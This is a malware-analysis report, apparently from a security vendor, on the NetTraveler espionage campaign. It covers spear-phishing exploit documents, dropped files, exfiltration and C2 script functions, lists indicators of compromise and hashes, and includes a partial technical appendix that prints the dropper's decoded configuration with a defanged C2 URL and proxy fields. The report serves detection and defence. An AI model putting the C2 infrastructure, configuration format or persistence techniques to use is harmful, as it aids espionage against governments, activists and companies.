















































 The NeTTraveler  
 (aka ‘TravNeT’) 
Author GlobAl reseArch And AnAlysis teAm



2

The NeTTraveler

Part 1 (Public):

 > executive summary

 > Attack analysis

 > c&c infrastructure

 > statistics

 > mitigation

 > conclusions

Part 2 (contact us for more information: 
intelrePorts@kasPersky.com):

 > Victim analysis and profiles

 > command and control (c&c) infrastructure 

and operation

 > Attribution information

The NeTTraveler



 3

1. execuTive Summary

1. executiVe summAry

this report describes multiple cyber-espionage 

campaigns that have successfully compro-

mised more than 350 high profile victims in 40 

countries. the focus of the paper is to describe 

nettraveler, which is the main tool used by the 

threat actors during these attacks.

 the name “nettraveler” comes from an internal 

string which is present in early versions of the 

malware: “nettraveler is running!”. this mal-

ware is used by APt actors for basic surveillance 

of their victims. earliest known samples have a 

timestamp of 2005, although references exist 

indicating activity as early as 2004. the largest 

number of samples we observed were created 

between 2010 and 2013.

 Known targets of nettraveler (also known as 

‘travnet’ or “netfile”) include tibetan/uyghur 

activists, oil industry companies, scientific re-

search centers and institutes, universities, 

private companies, governments and govern-

mental institutions, embassies and military con-

tractors.

the nettraveler backdoor is often used together 

with other malware families. during the anal-

ysis of one of the command and control (c&c) 

servers, we observed how the attackers de-

ployed different backdoors to the victims’ ma-

chines. these include the malware known as 

“saker” also known as “xbox” (known filenames: 

“update.exe”, “updata.exe” or “xbox.exe”) and 

“Pcrat” / ”Zegost”. this report includes a full 

description of the “saker/xbox” backdoor as 

well.

 the attacks use spear-phishing e-mails with 

malicious microsoft office documents as attach-

ments. Gathered data includes file system list-

ings, keylogs, various types of documents (.doc, 

.xls, .ppt, .pdf, etc...) and other private informa-

tion. We have calculated the amount of stolen 

data stored on c&c servers to be 22+ gigabytes. 

however this data represents only a small frac-

tion which we managed to see - the rest of the 

it had been previously downloaded and deleted 

from the c&c servers by the attackers.



4

The NeTTraveler

nettraveler victims get infected through spear-phishing attacks using office documents 

which exploit two publicly known vulnerabilities -- cVe-2012-0158 and cVe-2010-3333. 

Although these vulnerabilities have been patched by microsoft, they remain effective and 

are among the most exploited in targeted attacks.

during our analysis, we did not see any advanced use of zero-day vulnerabilities or other 

malware techniques such as rootkits. it is therefore surprising to observe that such un-

sophisticated attacks can still be successful with high profile targets.

2.1 Point of entry: sPear-Phishing examPles

We are listing below several nettraveler spear-phishing examples observed during the 

course of this investigation

mD5 29a420e52b56bfadf9f0701318524bef

create date (GmT) 2011-04-27 10:10:00

Size 274,291

vulnerability Targeted cVe-2010-3333

 2. aTTack aNalySiS

this spear-phish targeted cVe-2010-3333, 

a very popular vulnerability exploited in many 

attacks. the development of this version of 

the exploit delivers a large, easily identified 

“0x4141” noP sled prior to its shellcode, shed-

ding some light on the immaturity of the devel-

opment behind the effort. more interesting is 

that the target in india received this file titled 

“Army cyber security Policy 2013.doc”, and 

the accompanying benign and empty decoy 

Word document is dropped to the temp folder 

and opened with Word as “Jallianwala bagh 

massacre a deeply shameful act.doc” (md5: 

e617348b8947f28e2a280dd93c75a6ad).



 5

 2. AttAcK AnAlysis

kaspersky lab verdict: exploit.mSWord.

cve-2010-3333.cl

the exploit drops  

 > %temp%\netmgr.dll

 > %temp%\netmgr.exe

 > %temp%\perf2012.ini

 > %temp%\sysinfo2012.dll

 > %temp%\winlogin.exe

 

the malware command and control server 

script is at “hxxp://www.faceboak.net/2012nt/

nettraveler.asp”.

mD5 b600089a93275fa935 58695b707b87ad

create date (GmT) 2011-04-27 10:10:00

Size 274,291

vulnerability 
Targeted cVe-2010-3333

Filename: “invitation.doc”

decoy filename: “mailnew.doc” (empty) 

kaspersky lab verdict: exploit.mSWord.

cve-2010-3333.cl

drops:

 > %temp%\netmgr.dll

 > %temp%\netmgr.exe

 > %temp%\perf2012.ini

 > %temp%\enumfs.ini

 > %temp%\dnlist.ini

 > %temp%\sysinfo2012.dll

 > %temp%\winlogin.exe

  

mD5 6eb5932b0ed20f11f1a 887bcfbdde10f

create date (GmT) 2011-04-27 10:10:00

Size 274,291

vulnerability 
Targeted cVe-2010-3333

Filename: “report - Asia defense spending 

boom.doc”

decoy filename: “report--Asia defense spend-

ing boom.doc” (empty) (md5: e617348b-

8947f28e2a280dd93c75a6ad)

kaspersky lab verdict: exploit.mSWord.

cve-2010-3333.cl

drops:

 > %windir%\system\config_t.dat

 > %windir%\system32\enumfs.ini

 > %windir%\system32\dnlist.ini

 > %windir%\system32\iasex.dll

 > %windir%\system32\system_t.dll



6

The NeTTraveler

mD5 917e36946c67414a988f6 878d9d0cdfe

create date (GmT) 2011-04-27 10:10:00

Size 252,275

vulnerability 
Targeted cVe-2010-3333

e-mail spear-phishing sample entitled “his holi-

ness the dalai lama’s visit to switzerland day 4”.

Attachment filename: “his holiness the dalai 

lama’s visit to switzerland day 3.doc”

decoy filename: “his holiness the dalai lama’s 

visit to switzerland day 3.doc”

 

kaspersky lab verdicts: exploit.mSWord.

cve-2010-3333.ci

multiple decoy images depicting a large tibetan
audience, and the dalai lama speaking

drops:

 > %Appdata%\Adobe\netmgr.dll

 > %Appdata%\Adobe\netmgr.exe

 > %Appdata%\Adobe\perf2012.ini

 > %Appdata%\Adobe\sysinfo2012.dll

 > %Appdata%\Adobe\enumfs.ini

 > %temp%\winlogin.exe



 7

 2. AttAcK AnAlysis

mD5 36ed86602661bb3a7a5 5e69fde90ee73

create date (GmT) 2011-04-27 10:10:00

Size 252,275

vulnerability 
Targeted cVe-2010-3333

Filename: “bJP won’t dump modi for nitish ndA 

headed for split.doc”

decoy filename: “bJP won’t dump modi for nitish 

ndA headed for split.doc”

kaspersky lab verdict: exploit.mSWord.cve-

2010-3333.ci

 

drops:

 > %Appdata%\Adobe\netmgr.dll

 > %Appdata%\Adobe\netmgr.exe

 > %Appdata%\Adobe\perf2012.ini

 > %Appdata%\Adobe\sysinfo2012.dll

 > %Appdata%\Adobe\enumfs.ini

 > %temp%\winlogin.exe

decoy document with text related to politics in india.



8

The NeTTraveler

mD5 63494c74db9bfc2bba 3983698c952de9

create date (GmT) 2011-04-27 10:10:00

Size 234,355

vulnerability 
Targeted cVe-2010-3333

Filename: “Fax13-0417.doc”

decoy filename: “Fax13-0417.doc” (empty)

kaspersky lab verdict: exploit.mSWord.cve-

2010-3333.ci

 drops

 > %Appdata%\Adobe\netmgr.dll

 > %Appdata%\Adobe\netmgr.exe

 > %Appdata%\Adobe\perf2012.ini

 > %Appdata%\Adobe\sysinfo2012.dll

 > %Appdata%\Adobe\enumfs.ini

 > %temp%\winlogin.exe

mD5 151e5d1bb8142835633 cfd398e2e0ca3

create date (GmT) 2011-04-27 10:10:00

Size 225,139

vulnerability 
Targeted cVe-2010-3333

Filename: “the Prayer.doc”

decoy filename: “Freedom of speech.doc” (empty)

kaspersky lab verdict: exploit.mSWord.cve-

2010-3333.ci

 drops

 > %Appdata%\Adobe\netmgr.dll

 > %Appdata%\Adobe\netmgr.exe

 > %Appdata%\Adobe\ie.log

 > %Appdata%\Adobe\perf2012.ini

 > %temp%\winlogin.exe

mD5 059a7482efee3b2abf67c 12d210cb2f7

create date (GmT) 2011-04-27 10:10:00

Size 225,139

vulnerability 
Targeted cVe-2010-3333

Filename: “Activity details.doc”

decoy filename: “Activity details.doc” (empty)

kaspersky lab verdict: exploit.mSWord.cve-

2010-3333.ci

drops:

 > %Appdata%\Adobe\netmgr.dll

 > %Appdata%\Adobe\netmgr.exe

 > %Appdata%\Adobe\perf2012.ini

 > %temp%\winlogin.exe files.

mD5 f4f14d4a1e34f62eeb9 a90b5c8b2cfc1

create date (GmT) 2011-04-27 10:10:00

Size 225,139

vulnerability 
Targeted cVe-2010-3333

Filename: “23948-report.doc”

decoy filename: “report.doc” (empty)

kaspersky lab verdict: exploit.mSWord.cve-

2010-3333.ci

 drops

 > %Appdata%\Adobe\netmgr.dll

 > %Appdata%\Adobe\netmgr.exe

 > %Appdata%\Adobe\enumfs.ini

 > %Appdata%\Adobe\perf2012.ini

 > %temp%\winlogin.exe



 9

 2. AttAcK AnAlysis

mD5  e5954b8204eb321d 20bed4a86b3cef34

create date (GmT)

Size 414,703

vulnerability 
Targeted  cVe-2010-3333

Filename: “Alban tushaal Jagsaalt.doc”

decoy filename: “document.doc” (mongolian 

text)

kaspersky lab verdict: exploit.mSWord.cve- 

2010-3333.ci

 drops

 > %temp%\smcs.exe

 > %windir%\system\config_t.dat

 > %windir%\system32\6to4ex.dll

 > %windir%\system32\svchost.log

mD5  0e2b10015fe52b7ea77 a213f0c330557

create date (GmT)  2012-06-29 08:31:45

Size  222,208

vulnerability 
Targeted  cVe-2012-0158

Filename: “data.xls” (empty decoy)

kaspersky lab verdict: exploit.Win32.cve- 

2012-0158.y

 drops:

 > %temp%\enumfs.ini

 > %temp%\sysinfo2012.dll

 > %temp%\dnlist.ini

 > %temp%\netmgr.dll

 > %temp%\perf2012.ini

 > %temp%\netmgr.exe

decoy document with mongolian writing



10

The NeTTraveler

 by default, nettraveler exfiltrates common file 

types such as doc, xls, PPt, rtF and PdF. For 

a full list, see the detailed backdoor analysis 

below. the backdoor configuration can however 

be extended with special options to steal other 

file types. here’s one such extended configura-

tion recovered from an attack against a victim 

working in the oil industry:

it is clear that the attackers are also collecting 

files of type “.cdr” (corel draw designs), “.dwg”, 

“.dxf”, “.cdw”, “.dwf” (AutocAd projects) and 

some configuration files “.cfn” and “.cfg”.

 the various parameters of the malware are con-

figured with a builder, which allows the attackers 

to change things such as the list of stolen files 

extensions, c2 address and so on:

2.3 installed malware, functionality, 
Persistence

 nettraveler is an automatic data exfiltration tool, designed to extract large amounts 

of private information from the victim’s system over long periods of time. the malware 

uses compression techniques and a fail-safe protocol to ensure that uploaded data is 

safely transferred to the attacker’s c2s.



 11

 2. AttAcK AnAlysis

2.4 exfiltrated data

exfiltrated data is encoded with a custom compression and encoding library, which pro-

duces files which resemble bAse64. the data is transferred to the command and control 

servers via httP requests such as:

nettraveler configuration Gui



12

The NeTTraveler

2.5 overlaP with red 
october

note: for our analysis of the red october cam-

paign, see: https://www.securelist.com/en/

blog/785/the_red_october_campaign_An_

Advanced_cyber_espionage_network_target-

ing_diplomatic_and_Government_Agencies

during our analysis of nettraveler infections, 

we identified several victims that were infected 

both by nettraveler and red october. Although 

we see no direct links between the nettraveler 

attackers and the red october threat actor, the 

existence of victims infected by both of these 

campaigns is interesting.

these victims are:

 > A military contractor in russia

 > An embassy in iran

 > An embassy in belgium

 > An embassy in Kazakhstan

 > An embassy in belarus

 > A Government entity in tajikistan

these infections indicate that certain high profile 

victims are targeted by multiple threat actors; 

the target information is a valuable commodity.

2.6 connections with 
other camPaigns

to better identify core nettraveler actors and 

delineate the groups from one another, we 

collect and categorize various tactics, tech-

niques, and Procedures (ttPs) employed by 

these adversaries throughout their operations. 

the attacker’s iP operation ranges, overlaps 

with that of a malware family known as “Ze-

gost”. For instance, one of the command and 

control servers that is part of the infrastruc-

ture, is a well-known c2 for multiple Zegost 

variants, still active as of may 2013. the tar-

gets and command and control domain naming 

scheme indicates a connection between the 

lurid/enfal attackers and nettraveler. some 

of the nettraveler c2’s are used to distribute 

a malware known as “saker” or “xbox”, which 

is delivered as an “update” to the nettraveler 

victims.

note: more details about the connections 

between nettraveler and other campaigns 

is available in our private report. contact 

us at intelreports@kaspersky.com for more 

details.



 13

3. commAnd And control serVers And inFrAstructure

 the command and control servers generally run 

iis 6/7, as the c2 backend is an AsP (microsoft 

Active server Pages) script.

to transfer stolen data from the command and 

control servers, the attackers use FtP on top 

of VPn connections through a server in the us 

hosted by Krypt technologies. the infrastructure 

is secured by allowing FtP access only to remote 

users coming from predefined iPs, including the 

VPn provider in the us.

during our investigation, we analyzed several 

hundred nettraveler samples and configuration 

files, which use more than 30 different c&c serv-

ers. the list below includes the script names that 

we have seen on these servers and confirmed 

as malicious:

aasogspread.asp, adfsdfclnggsldfc.asp, 

advertisingservicesa3sb.asp, aneywsf.

asp,  apple.asp,  applebag0 05.asp, 

azarweforrell.asp, azofjeljgo648rl.asp, 

certify.asp, dochunter.asp, dochunter1.asp, 

dochunteradfaefaer.asp, fish.asp, happy.

asp, heritage.asp, huyuio67.asp, little.asp, 

madmaswhbe.asp, nethttpfile.asp, netpass.

asp, nettraveler.asp, orphaned.asp, rice.asp, 

sabcfsf.asp, shenghai.asp, time.asp, update.

asp, weathobloe.asp, yegnfvhemc.asp

All the known command and control servers per-

form the same basic functions - for a description 

of the supported functionality, see below.

3. commaND aND coNTrol 
ServerS aND iNfraSTrucTure

during our monitoring period, we observed more than 100 command and control urls, 

pointing to multiple servers in the united states, china and hong Kong.



14

The NeTTraveler



 15

3. commAnd And control serVers And inFrAstructure

 3.1 descriPtion of c2 scriPt functionality

the main function of command and control servers is to collect stolen data from the 

victims. stolen data is stored in the exact format it was sent from the victim’s Pc, without 

any additional encoding or obfuscation.

 here’s a listing of how a folder storing stolen victim data could look on the c&c server:

the uploaded data can be either a document file, a keylogger backlog or a system infor-

mation profile. here’s how a decoded system information profile looks like:

 

 



16

The NeTTraveler

the system profile includes an iPconFiG output as well as a list of user accounts in the 

machine. if the malware install includes the “netPass” module, a keylogger will silently 

collect all typed data, together with window names. this produces logs like the following 

(in decoded format):

system profile, filename is of the form ‘@@@dll@@@travlerbackinfo-[date/time].bak’

sample decrypted log from the keylogging module



 17

3. commAnd And control serVers And inFrAstructure

command 
“action”)

Purpose script 
generation

getdata

read list of commands from the configuration file (eg. “nettraveler.
txt”) and send it to the victim. commands can be “uninstAll”, 
“reset”, “uPdAte”, “uPloAd”. For a description of these com-
mands see the technical appendix.

nettraveler.asp

updated report to the c2 a successful exfiltration of victim’s data. nettraveler.asp

getemail read a template file (eg. “email.eml”) and send to victim nettraveler.asp

gotemail delete template from c2 (“email.eml”) nettraveler.asp

datasize report filesize of additional backdoor module (eg. “updata.exe”) nettraveler.asp

getcmd Get specific individual commands to be executed on the victim’s machine. nettraveler.asp

gotcmd delete specific individual command for the victim from the c2 nettraveler.asp

gettext send a specific text file from the c2 to the victim (eg. “nethttpfile.txt”) happy.asp

downloaded same as “updated” command happy.asp

downloadsize, 
updatesize same as datasize happy.a

the command and control scripts reply to the 

victim with either “success:<size>” or “Fail!”, de-

pending on the result of the operation. in some 

cases, instead of the “Fail” string, a more de-

tailed error is sent back to the victim, in simpli-

fied chinese:

under normal operation, a victim can connect 

to the c2 every five seconds and upload chunks 

of data from the victim, until the entire file is 

successfully transferred. in case of errors, the 

malware continues to send the data over and 

over, until they succeed.

the command and control scripts implement several functions to communicate with the 

victim; during our analysis, we observed four different generations of these scripts, with 

various degrees of complexity. the main function of the c&c script saves stolen data to 

a folder in the c2 root, unless the request variable “action” is defined, in which case, it 

performs one of the following commands:

“无法删除!” - means “can not be deleted!”

“该文件不存在!” - means “the file does not exist!”



18

The NeTTraveler

during our analysis, we obtained infection logs from several command and control 

servers. the logs, which go back as far as 2009, show that the threat actors behind 

nettraveler successfully infected more than 350 victims in 40 countries. the following 

map shows the locations and profile of the victims:

4. Global iNfecTioN STaTiSTicS



 19

4. GlobAl inFection stAtistics

the following map lists the victim profiles by industries:

in addition to the data from the command and 

control servers, we collected statistics regarding 

detections of nettraveler from the Kaspersky 

security network. the top 10 infected coun-

tries as reported in Ksn (Kaspersky security 

network):

Position  country  % of total

 1  mongolia  29%

 2  russia  19%

 3  india  11%

 4  Kazakhstan  11%

 5  Kyrgyzstan  5%

 6  china  3%

 7  tajikistan  3%

 8  south Korea  2%

 9  spain  2%

 10  Germany  1%

Note: chart does not include the victims that couldn’t be identified

besides the c&c logs and Ksn, we have also 

sinkholed two of the c&c domains used by 

nettraveler:

 >  pkspring.net

 > yangdex.org

 the data set collected so far from the sinkhole 

is relatively small and includes victims in mon-

golia, south Korea and india. We will continue 

to monitor the connections and over time, up-

date this paper with more data as it becomes 

available.

Note: Taking into account that several other C&C 

servers exist for which we have no logs and the KSN 

coverage, we estimate the total number of victims 

worldwide to be around ~1,000.

Diplomatic 32%

Government 19%

Military 9% Private 11%

Industrial and 
Infrastructure 7%

Airspace 6%

Research 4%

Activism 3%

Health 2%

Financial 3%

IT 3%

Press 1%



20

The NeTTraveler

From the point of view of the victims, the most 

important part of any report is information on 

how to detect and eradicate the infections. in 

addition to running a modern security suite ca-

pable of detecting nettraveler, things such as 

filenames or c2 iPs can be extremely useful to 

system administrators.

this part of the report includes:

 > indicators of compromise

 > Kaspersky detection names

 > md5s of known samples

5.1 indicators of 
comPromise:

t yPes oF iocs:

network traffic / iPs

 > 209.11.241.144 - mothership, VPn serv-

er, c2

 > 121.12.124.69 - c2 (allen.w223.

west263.cn)

 > 61.178.77.111 - c2 (wolf0.3322.org)

 > 182.50.130.68 - c2 (viprambler.com)

 > 103.20.192.59 - c2 (sunshine.59.ydli.net)

5. miTiGaTioN iNformaTioN

 > 213.156.6.122 - c2 (cultureacess.com)

 > 209.130.115.38 - c2 (tsgoogoo.net)

 > 98.143.145.80 - c2 (spit113.minidns.

net)

 > 96.46.4.237 - c2 (sghrhd.190.20081.

info)

 > 109.169.86.178 - c2 (imapupdate.com)

 > 125.67.89.156 - c2 (faceboak.net)

 > 142.4.96.6 - c2 (buynewes.com)

 > 124.115.21.209 - c2 iP

 > 67.198.140.148 - c2 (southstock.net)

 > 96.44.179.26 - c2 (vip222idc.

s169.288idc.com)

 > 235.22.123.90 - c2 (gami1.com)

 > 178.77.45.32 - c2 (ra1nru.com)

 

command and control domains and server 

names:

 > allen.w223.west263.cn

 > andriodphone.net

 > bauer.8866.org

 > buynewes.com

 > cultureacess.com

 > discoverypeace.org

 > drag2008.com

 > eaglesey.com

 > enterairment.net

 > faceboak.net



 21

5. mitiGAtion inFormAtion

 > gami1.com

 > globalmailru.com

 > hint09.9966.org

 > imapupdate.com

 > inwpvpn.com

 > keyboardhk.com

 > localgroupnet.com

 > mailyandexru.com

 > msnnewes.com

 > newesyahoo.com

 > newfax.net

 > pkspring.net - sinkholed by Kaspersky 

lab

 > ra1nru.com

 > ramb1er.com

 > sghrhd.190.20081.info

 > southstock.net

 > spit113.minidns.net

 > tsgoogoo.net

 > vip222idc.s169.288idc.com

 > viplenta.com

 > vipmailru.com

 > viprainru.com

 > viprambler.com

 > vipyandex.com

 > vpnwork.3322.org

 > wolf0.3322.org

 > wolf001.us109.eoidc.net

 > yahooair.com

 > yangdex.org - sinkholed by Kaspersky 

lab

 > zeroicelee.com

malware file names on disk:

 > main active group(s) in 2013, unique 

configuration filenames: perf2012.

ini, config_t.dat, config_shenghai.dat, 

pert2012.ini, in:

• c:\documents and settings\[user]\

local settings\temp\

• c:\users\[user]\local settings\temp\

• c:\WindoWs\temp\

• c:\WindoWs\system\

 > other (older) variants, configs: FmiFen.ini 

in:

• %system%

 > malware body: net.exe, netmgr.exe, net 

mgr.dll in

• c:\

• c:\WindoWs\system\

• %system%

• %temp%

• c:\WindoWs\temp\

• %appdata%\Adobe\

 > other (older) variants, malware bodies:

• %system%\bootuid.dll

• %system%\wuaucit.exe

• %system%\6to4ex.dll

• %temp%\Process.dll

• %temp%\Process.dll_d

• %temp%\cmss.exe

• %temp%\sysinfo2012.dll

• %temp%\winlogin.exe

• %windir%\system32\iasex.dll

• %windir%\system32\system_t.dll

• %temp%\smcs.exe

• %appdata%\Adobe\sysinfo2012.dll



22

The NeTTraveler

 > Artifacts during installation and running:

• %temp%\Win32en.bat

• %system%\dnlist.ini

• %temp%\dnlist.ini

• %appdata%\Adobe\ie.log

• %temp%\ie.log

• %system%\enumfs.ini

• %temp%\enumfs.ini

• %system%\install.tmp

• %system%\kyrecord.txt

• c:\documents and settings\<user>\

start menu\Programs\startup\seru-

vice.lnk

• c:\documents and settings\<user>\

start menu\Programs\startup\net-

mgr.lnk

• c :\ d o c u m e~1\<u s e r>~1\ l o 

cAls~1\temp\recycler_w\Allindex.

ini

• c :\ d o c u m e~1\<u s e r>~1\ l o 

cAls~1\temp\recycler_w\Allindex.

ini_d

mutexes created during backdoor operation:

 > boat-12 is running!

 > dochunter2012 is running!

 > hunter-2012 is running!

 > nt-2012 is running!

 > nettravler is running!

 > nettravler2012 is running!

 > sh-2011 is running!

 > shenghai is running!

5.2 malware names by 
KasPersKy Products

detection names for the malware modules and 

related files:

 > backdoor.Win32.bifrose.bcx

 > trojan-dropper.Win32.dorifel.acrn

 > trojan-dropper.Win32.dorifel.acsj

 > trojan-dropper.Win32.dorifel.acsm

 > trojan-dropper.Win32.dorifel.acuf

 > trojan-dropper.Win32.dorifel.cql

 > trojan-dropper.Win32.dorifel.fhg

 > trojan-dropper.Win32.dorifel.fny

 > trojan-dropper.Win32.dorifel.iat

 > trojan-dropper.Win32.dorifel.jam

 > trojan-dropper.Win32.dorifel.kcy

 > trojan-dropper.Win32.dorifel.ylt

 > trojan-spy.Win32.travnet.*

 > trojan.multi.yahg.a

 > trojan.Win32.Agent2.eakj

 > trojan.Win32.Agent2.exms

 > trojan.Win32.Agent2.ezgb

 > trojan.Win32.Agent2.fdhs

 > trojan.Win32.delf.dgmw

 > trojan.Win32.delf.dgmx

 > trojan.Win32.Genome.agyil

 > trojan.Win32.Genome.aiunu

 > trojan.Win32.Genome.ajeqr

 > trojan.Win32.Genome.akqco

 > trojan.Win32.Genome.aksho

 > trojan.Win32.Jorik.travnet.*

 > not-a-virus:downloader.Win32.nettrav 

eler.*



 23

5. mitiGAtion inFormAtion

Kaspersky detection names for malicious 

documents with embedded exploits used in 

spear-phishing attacks:

 > exploit.msWord.cVe-2010-3333.cg

 > exploit.msWord.cVe-2010-3333.ci

 > exploit.msWord.cVe-2010-3333.cl

 > exploit.Win32.cVe-2012-0158.y

 > exploit.msWord.cVe-2012-0158.an

 > exploit.msWord.cVe-2012-0158.ax

 > exploit.Win32.cVe-2012-0158.aa

5.3 md5s of malicious files

spear-phishing samples md5s:

36ed86602661bb3a7a55e69fde90ee73

6eb5932b0ed20f11f1a887bcfbdde10f

059a7482efee3b2abf67c12d210cb2f7

e5954b8204eb321d20bed4a86b3cef34

63494c74db9bfc2bba3983698c952de9

b600089a93275fa93558695b707b87ad

f4f14d4a1e34f62eeb9a90b5c8b2cfc1

0e2b10015fe52b7ea77a213f0c330557

29a420e52b56bfadf9f0701318524bef

malware modules:

01d06f85fce63444c3563fe3bd20c004

03e8d330abc77a6a9d635d2e7c0e213a

08e5352a2416bd32a1c07f2d6c2f11fa

13b3cb819b460591c27e133e93fb8661

19a0693480c82f2b7fc8659d8f91717a

1a70e1e36e6afa454f6457140ac3d2ec

1dcad7c8f56207b2c423353f0c328755

1f26e5f9b44c28b37b6cd13283838366

209c3b51cad30c85ca79a9f067ce04cd

22be9cca6e4ec3af327595b890a92fec

28e9faec9de3bbdeb65435bfc377d1f8

294da087e6329ae78c1a5fb42b999500

29a394a4ec8a30b5f36c7b874fc9fe10

2a43c23a17cd2bc9074a486c47444e7c

2ac8f77548e87b401767c7076adfa00d

2d0e4748d857c12184ed2c94c13ec1ae

2dc139d82a2a5bf027bcb6a40f75b3f4

33334d8dc36c4ee7739fe2f8b448da72

36f9a0e71f0b580333c61bfeaa88df39

37d588b289c65f10c256e43eba939a0a

382c1d692dd3cec9b046e5c0eeaf92e6

39c2b2ee24373bf1ef20faff958718bc

3b4cf5f1ff8c4187e41c6ab80f000491

3cb96fe79aa01c82ac68c54e88918e57

482f112cb7cb0293d99f8a7606acbe85

4968882f189236952fd38a11586b395a

4c8950da250ea135ee77a2644af414ba

524aed944b7f307eea5677eda7e2079a

54583ccc97c33e358510b563b1536e69

57f2374d9f2a787339b0c6a5b1008a72

5e35b31472a2e603a995198d8e8411ed

5e7c5e8d9f5864488ddf04b662d1ad8e

63f0f91e3ccf5dd00a455d3038a299f4

66684b8b82fb5318a41ab7e6abb8dd42

677f7c42f79a0a58760056529739fdd6

6afeec03c8f4bc78fa2b3ad27392b0e7

6d00e4f95fba02126b32bb74dc4fec55

6d49cdbade7541d46be3fb47a0f563bb

6de813a22b2b73e330085ec7c85e041b



24

The NeTTraveler

71f311a648348e7598eb55ab7618842c

723129912a2d0fb4aede7100071787ef

778c1764dd5c36c1eb96c49a8f8441e6

7b92e9d21bc4db838bc102b289f4fd5f

812d8e4d7a484bb363b139cfa08617e5

81591ae1c975b8a0b5ad5546a103992c

81d92e20f3078bd8e43b226308393e43

83429db9cc63196bf42c691cc09b7b84

852f562812305ad099372109f8e8b189

85865e048183849b255c92e609a5fa25

86cce64193a347b50329a32cdf08d198

89bfd463ca76b62c61a548778316567d

8ccea94fd83d9cb1b15a2a4befec24a2

8d3036a65ac2404d4562cdb927fd3d2c

8d78a9e3df1e19f9520f2bbb5f04cb54

8dc61b737990385473dca9bfc826727b

95113e04af14c23df607964fa9d83476

9b198f1e260700bdcb4740266cd35b3f

9c1c2825532b25e266d62db50952ab44

9c544da8c23826379d60581cce17a483

a0e350787e4134ea91ccb26d17cdf167

a1169fb2eb93616ced7536a53fb05648

a431d5786d9d95bc9d04df07cbefc0a2

a6d89df2a80675980fb3e4a9bcc162e2

a77456a160890a26a8f7c019c2e77021

aa6f8eff83aea3ff7b8f016e67f74dac

af6649323daf6dbd3aef1b950588487c

b3840ec1299517dacd6c18c71ff5bafc

b8c99bc028a0a32288d858df7bf6bec1

b990752f8266d7648070bea7e24d326f

ba026e6190aee2c64ef62a4e79419bcf

bea6e3481c0a06ce36600d8b3cc6155b

c87e8a3ceefd93c7e431b753801c6bb6

cb9cc50b18a7c91cf4a34c624b90db5d

cebaaad59f1616698dec4f14d76b4c9a

d04a7f30c83290b86cac8d762dcc2df5

d218706eb07f2722ae4e0106cce27d52

d286c4cdf40e2dae5362eff562bccd3a

d2fe88fff648a0bcbfdf0f0bd042a0a4

d354b71116961cad955ed11cb938ca32

d687cfde1c4ea77de1b92ea2f9e90ad5

d80c29813bfbc3cbcbd469249d49ebf3

d9c0ca95e49b113c5751fffdb20beb3f

d9cf41b5d11e42dabf9470964d09c000

db6e36f962fdb58c8e9f8f9a781fda66

dc01df3c40cb4fb0bef448693475ea1b

def612ad0554006378f185d3b56efb57

e51a4cc0272a98e9eddfec16667603f4

e5b1ffd2ecd7e610d07d093d65639da9

eb5761c410b5139f23235e9b67964495

eefc66a1e978dc9d825f28702106d4d5

efa23860086c5d12d3e6b918073c717f

f3c5c20f5c45fc401484caf72753d778

fad8f37c9bd5420f49cfd5960a60fa24

fb3495715764cdaa547f2b040c0a9b1f

fc3853c2383e2fbb2af381fd1277504d

fe16c30782e2b16b07d5a3a1cf9dfb8f

ff04126a5d61a10c81bfd0a6d0a643d0



 25

conclusions

during our analysis, we describe nettraveler, a 

malicious data exfiltration tool used by a me-

dium-sized threat actor group from china. the 

main targets of the group include government 

institutions, embassies, oil and gas industry, 

research institutes, universities, private com-

panies, military contractors and activists. the 

group’s domains of interest include space ex-

ploration, nanotechnology, energy production, 

nuclear power, lasers, medicine and communi-

cations between others.

Although not very advanced, the netttraveler 

attackers have successfully compromised hun-

dreds of targets around the world, with the high-

est number in mongolia, india and russia.

the group using nettraveler is also employing 

other malware, including Zegost, saker and oth-

ers. to compromise their victims, they rely on 

exploits for two popular vulnerabilities in mic-

rosoft office.

based on collected intelligence, we estimate the 

group size to about 50 individuals, most of which 

speak chinese natively and has knowledge of 

english language.

by publishing this report we would like to raise 

awareness of all organizations and individuals 

who might become a victim of these attackers. 

We would like to encourage people of all coun-

tries to learn something from this report, check 

their systems and be prepared for potential fu-

ture cyberattacks against them.

more information on attribution and victims will 

be available to selected parties, including lo-

cal authorities of victim countries. For details, 

please contact us at intelreports@kaspersky.

com.

coNcluSioNS:



26

The NeTTraveler

descriPtion

the module is a Win32 Pe executable file com-

piled in microsoft Visual c++ 6.0. its main pur-

pose is to drop a dll file and register it as a sys-

tem service. the malware looks up a suitable 

service name from one of the values in the reg-

istry.

 this module also drops an ini-type file with the 

configuration that is later used by the nettrav-

eler backdoor.

technicAl detAils

execution of the module starts with the creation 

of a system mutex object called “instAll ser-

Vices noW!”. if this mutex already exists the 

module quits to avoid duplicate instances of the 

same module from running.

 After that, the module creates the configura-

tion file named %Windir%\system\config_t.dat 

which is populated with the strings embedded in 

the body of the executable and encrypted with 

simple one-byte xor (0x3e).

 appeNDix a: 
malWare TechNical aNalySiS

encrypted configuration data in the dropper

the nettraveler droPPer

mD5  2a43c23a17cd2bc9074a486c47444e7c

create date (GmT)  2013.02.18 07:54:28

Size  176’640

linker version  6.0 (msVc++ 6.0)



 27

APPendix A: mAlWAre technicAl AnAlysis

the config_t.dat is an ini-type file which contains 

the module configuration shown below:

[Option]

WebPage=hXXp://vip222idc.s169.288idc.com/nt12/

newyork/city/nettraveler.asp2

DownCmdTime=10

UploadRate=128

[Other]

UP=0

[OtherTwo]

AutoCheck=1

 

the WebPage parameter’s maximum length is 

128 bytes and represents a url for the com-

mand and control server (c&c). downcmdtime 

is the delay in minutes between requests sent 

to the c&c server.

the code of the function to dump the ini file 

is designed to process several cases. there is 

1 byte value for variable uP (which stands for 

“use Proxy”) from section [other]. if that value 

is set to 1 (absolute file offset 0x334) then the 

ini file section [other] will be populated with the 

following values:

[Other]

UP=1

PS=<string (max 32 bytes from offset 0x335)>

PP=<integer (2 bytes and positive from offset 0x355)>

PU=<string (max 32 bytes from offset 0x357)>

PW=<string (max 32 bytes from offset 0x377)>

PF=<integer (2 bytes and non-negative from offset 

0x397)>

the purpose of Ps, PP, Pu, PW, PF parameters 

is the following:

 >  Ps = proxy server address

 > PP = proxy server port

 > Pu = proxy username

 > PW = proxy password

 > PF parameter purpose remains unclear.

 

the module then queries registry value at 

hklm\SofTWare\microsoft\Windows 

NT\\currentversion\Svchost\netsvcs which 

is a multi-string type of value. then it iterates 

through the names of services in that value to 

find a special service name. it must not be the 

“6to4” service and there must not be registry 

key hklm\SySTem\currentcontrolSet\Ser-

vices\<servicename>.

on Windows xP services that match the de-

